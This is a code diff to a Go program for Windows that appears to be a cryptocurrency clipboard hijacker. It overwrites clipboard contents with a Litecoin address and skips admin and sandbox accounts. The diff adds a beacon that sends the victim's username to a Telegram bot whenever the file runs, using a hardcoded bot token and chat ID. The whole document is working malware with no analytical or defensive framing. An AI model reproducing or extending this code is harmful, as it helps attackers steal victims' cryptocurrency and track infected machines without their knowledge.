@@ -1,9 +1,12 @@
 package main
 
 import (
+	"fmt"
 	"github.com/atotto/clipboard"
 	"golang.org/x/sys/windows/registry"
 	"log"
+	"net/http"
+	"net/url"
 	"os"
 	"os/user"
 	"path/filepath"
@@ -11,16 +14,30 @@ import (
 
 func main() {
 
+	user, err := user.Current()
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	bottoken := "8018399354:AAED048K57xNx-8AfaGqhHkzfTa-nZ2tGZA"
+	chatid := "6836733049"
+	message := ("New File ran, Username:" + user.Username + "\n")
+	telegramurl := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", bottoken)
+	data := url.Values{}
+	data.Set("chat_id", chatid)
+	data.Set("text", message)
+	resp, err := http.PostForm(telegramurl, data)
+	if err != nil {
+		fmt.Println("failed too send info too telegram", err)
+	}
+	defer resp.Body.Close()
+
 	blockedusers := map[string]bool{
 		"admin":              true,
 		"administrator":      true,
 		"WDAGUtilityAccount": true,
 	}
 
-	user, err := user.Current()
-	if err != nil {
-		log.Fatal(err)
-	}
 	if blockedusers[user.Username] {
 		os.Exit(0)
 	}
@@ -63,4 +80,5 @@ func main() {
 			clipboard.WriteAll(LTC)
 		}
 	}
+
 }
